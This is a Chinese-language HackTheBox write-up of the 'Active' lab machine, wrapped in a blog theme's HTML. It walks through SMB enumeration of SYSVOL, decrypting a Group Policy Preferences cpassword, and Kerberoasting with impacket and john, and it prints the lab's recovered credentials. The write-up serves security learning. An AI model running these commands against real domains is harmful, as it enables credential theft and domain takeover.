@@ -1,0 +1,622 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HackTheBox - Active - Yueyejian’s Blog</title>
+<meta name="description" content="HackTheBox - Active About Active Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.">
+
+
+  <meta name="author" content="yueyejian">
+  
+  <meta property="article:author" content="yueyejian">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Yueyejian's Blog">
+<meta property="og:title" content="HackTheBox - Active">
+<meta property="og:url" content="http://localhost:4000/hack-the-box/Active/">
+
+
+  <meta property="og:description" content="HackTheBox - Active About Active Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2023-08-23T00:00:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://localhost:4000/hack-the-box/Active/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "yueyejian",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          Yueyejian's Blog
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a>
+        <img src="/assets/images/avatar.jpg" alt="yueyejian" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a>yueyejian</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">ワノ国</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://yueyejian13.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">首页</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/yueyejian13" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://paypal.me/yueyejian?country.x=C2&locale.x=zh_XC" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HackTheBox - Active">
+    <meta itemprop="description" content="HackTheBox - ActiveAbout ActiveActive is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.">
+    <meta itemprop="datePublished" content="2023-08-23T00:00:00+08:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">HackTheBox - Active
+</h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2023-08-23T00:00:00+08:00">August 23, 2023</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          11 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> Contents</h4></header>
+              <ul class="toc__menu"><li><a href="#hackthebox---active">HackTheBox - Active</a><ul><li><a href="#about-active">About Active</a></li><li><a href="#nmap">Nmap</a></li><li><a href="#smb-enumeration">Smb Enumeration</a></li><li><a href="#gpp-attack">GPP Attack</a></li><li><a href="#user-flag">User Flag</a></li><li><a href="#kerberoasting">Kerberoasting</a></li><li><a href="#root-flag">Root Flag</a></li></ul></li></ul>
+
+            </nav>
+          </aside>
+        
+        <h1 id="hackthebox---active">HackTheBox - Active</h1>
+<h2 id="about-active">About Active</h2>
+<p>Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.</p>
+
+<h2 id="nmap">Nmap</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.93 scan initiated Mon Aug 14 07:08:47 2023 as: nmap -n -v -sC -sS -sV --min-rate=1500 -oN nmap.txt 10.10.10.100
+Increasing send delay for 10.10.10.100 from 0 to 5 due to 354 out of 1179 dropped probes since last increase.
+Increasing send delay for 10.10.10.100 from 5 to 10 due to 28 out of 91 dropped probes since last increase.
+Nmap scan report for 10.10.10.100
+Host is up (0.36s latency).
+Not shown: 981 closed tcp ports (reset)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-08-14 11:08:59Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49165/tcp open  msrpc         Microsoft Windows RPC
+49176/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -1s
+| smb2-time: 
+|   date: 2023-08-14T11:10:00
+|_  start_date: 2023-08-14T11:02:37
+| smb2-security-mode: 
+|   210: 
+|_    Message signing enabled and required
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Aug 14 07:10:21 2023 -- 1 IP address (1 host up) scanned in 93.61 seconds
+</code></pre></div></div>
+<p>首先用nmap扫一下端口，不难看出这是一台装有域环境的靶机，域名是<code class="language-plaintext highlighter-rouge">active.htb</code>，系统是<code class="language-plaintext highlighter-rouge">Windows Server 2008 R2 SP1</code>，主机名是<code class="language-plaintext highlighter-rouge">DC</code></p>
+<h2 id="smb-enumeration">Smb Enumeration</h2>
+<p>因为139和445端口的开放，我们可以先来一个smbmap扫描                           <br />
+<code class="language-plaintext highlighter-rouge">smbmap -H 10.10.10.100</code>
+<img src="/images/hackthebox/active/0.png" alt="" /></p>
+
+<p>可以看到Replication在不添加用户名和密码的情况下是可读的，再加一个<code class="language-plaintext highlighter-rouge">-R</code>命令把它展开看看                       <br />
+<code class="language-plaintext highlighter-rouge">smbmap -H 10.10.10.100 -R Replication</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/htb/Active]
+└─$ smbmap -H 10.10.10.100 -R Replication              
+[+] IP: 10.10.10.100:445        Name: active.htb                                        
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        Replication                                             READ ONLY
+        .\Replication\*
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    active.htb
+        .\Replication\active.htb\*
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    DfsrPrivate
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Policies
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    scripts
+        .\Replication\active.htb\DfsrPrivate\*
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ConflictAndDeleted
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Deleted
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Installing
+        .\Replication\active.htb\Policies\*
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    {31B2F340-016D-11D2-945F-00C04FB984F9}
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    {6AC1786C-016F-11D2-945F-00C04fB984F9}
+        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\*
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+        fr--r--r--               23 Sat Jul 21 06:38:11 2018    GPT.INI
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Group Policy
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    MACHINE
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    USER
+        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\*
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+        fr--r--r--              119 Sat Jul 21 06:38:11 2018    GPE.INI
+        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\*
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Microsoft
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Preferences
+        fr--r--r--             2788 Sat Jul 21 06:38:11 2018    Registry.pol
+        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\*
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Windows NT
+        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\*
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Groups
+        .\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\*
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+        fr--r--r--               22 Sat Jul 21 06:38:11 2018    GPT.INI
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    MACHINE
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    USER
+        .\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\*
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Microsoft
+        .\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\*
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
+        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Windows NT
+
+</code></pre></div></div>
+<p>根据得到的结果我们可以推断出来这个Replication正是SYSVOL的拷贝。可见还有文件夹没有展开，那是因为默认的深度是5，那么我可以手动设置一个深度来进一步挖掘有用的信息     <br />
+<code class="language-plaintext highlighter-rouge">smbmap -H 10.10.10.100 -R Replication --depth 7</code></p>
+
+<p>当深度设置为7时，发现了Groups.xml</p>
+
+<p><img src="/images/hackthebox/active/1.png" alt="" /></p>
+
+<h2 id="gpp-attack">GPP Attack</h2>
+<p>关于Groups.xml的作用和来历在下面这篇文章里有很好的解释:</p>
+
+<ul>
+  <li><a href="https://adsecurity.org/?p=2288">Finding Passwords in SYSVOL &amp; Exploiting Group Policy Preferences</a></li>
+</ul>
+
+<p>然后用<code class="language-plaintext highlighter-rouge">smbmap -H 10.10.10.100 -R Replication --depth 7 -A Groups.xml -q</code>把 Groups.xml下载到本地</p>
+
+<p><img src="/images/hackthebox/active/2.png" alt="" /></p>
+
+<p>或者用smbclient把整个Replication下载下来</p>
+
+<p><img src="/images/hackthebox/active/3.png" alt="" /></p>
+
+<p>打开Groups.xml文件可以看到一个用户名<code class="language-plaintext highlighter-rouge">SVC_TGS</code>和一段cpassword，我们可以直接用kali自带工具gpp-decrypt解密这段密码，得到了明文密码：<code class="language-plaintext highlighter-rouge">GPPstillStandingStrong2k18</code></p>
+
+<p><img src="/images/hackthebox/active/4.png" alt="" /></p>
+
+<p>原理大概是微软在Windows Server 2008引进了一种新功能叫做GPP(Group Policy Preferences)，主要是管理员用来管理用户和组的。再设置组策略首选项时，系统会在SYSVOL文件夹生成一个Groups.xml文件，里面可能存有用户的账号和密码。安全起见，这里面的密码会被AES-256加密。但是，微软在2012年在MSDN上公布了这个AES秘钥，以至于用GPP来设置密码非常容易被破解</p>
+
+<h2 id="user-flag">User Flag</h2>
+<p>把得到的凭证<code class="language-plaintext highlighter-rouge">SVC_TGS:GPPstillStandingStrong2k18</code>添加进smbmap再扫描一下可以发现权限已然不同</p>
+
+<p><img src="/images/hackthebox/active/5.png" alt="" /></p>
+
+<p>在User共享目录下可以轻松地找到user.txt</p>
+
+<p><img src="/images/hackthebox/active/6.png" alt="" /></p>
+
+<p><img src="/images/hackthebox/active/7.png" alt="" /></p>
+
+<h2 id="kerberoasting">Kerberoasting</h2>
+
+<p>Kerberoasting攻击简单来说就是首先我们要有一个域用户，然后让其向KDC（Key Distribution Center）发送一个TGS_REQ请求，我们可以在TGS_REP返回的票据中尝试暴力破解服务运行时的任何用户的密码</p>
+
+<p>具体的攻击原理可以参考：</p>
+<ul>
+  <li><a href="https://room362.com/post/2016/kerberoast-pt1/">Kerberoasting - Part 1</a></li>
+  <li><a href="https://room362.com/post/2016/kerberoast-pt2/">Kerberoasting - Part 2</a></li>
+  <li><a href="https://room362.com/post/2016/kerberoast-pt3/">Kerberoasting - Part 3</a></li>
+</ul>
+
+<p>Kerberos验证过程：
+<img src="/images/hackthebox/active/8.png" alt="" /></p>
+
+<p>获取域内所有用户的用户名:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>impacket-GetADUsers <span class="nt">-all</span> active.htb/SVC_TGS:GPPstillStandingStrong2k18
+</code></pre></div></div>
+<p><img src="/images/hackthebox/active/9.png" alt="" /></p>
+
+<p>获取管理员的Kerberos票据：</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>impacket-GetUserSPNs <span class="nt">-request</span> active.htb/SVC_TGS:GPPstillStandingStrong2k18
+</code></pre></div></div>
+<p><img src="/images/hackthebox/active/10.png" alt="" /></p>
+
+<p>可以加一个参数<code class="language-plaintext highlighter-rouge">-outputfile</code>，让hash值储存到文件中，方便下一步破解</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>impacket-GetUserSPNs <span class="nt">-request</span> active.htb/SVC_TGS:GPPstillStandingStrong2k18 <span class="nt">-outputfile</span> tic.txt
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>john tic.txt <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</code></pre></div></div>
+
+<p><img src="/images/hackthebox/active/11.png" alt="" /></p>
+
+<h2 id="root-flag">Root Flag</h2>
+
+<p><code class="language-plaintext highlighter-rouge">Administrator:Ticketmaster1968</code></p>
+
+<p><img src="/images/hackthebox/active/12.png" alt="" /></p>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#active-directory" class="page__taxonomy-item" rel="tag">active-directory</a><span class="sep">, </span>
+    
+      <a href="/tags/#smb" class="page__taxonomy-item" rel="tag">smb</a><span class="sep">, </span>
+    
+      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">windows</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#hack-the-box" class="page__taxonomy-item" rel="tag">hack-the-box</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-08-23T00:00:00+08:00">August 23, 2023</time></p>
+
+
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/hack-the-box/brainfuck/" class="pagination--pager" title="HackTheBox - Brainfuck
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    
+  </ul>
+</div>
+
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
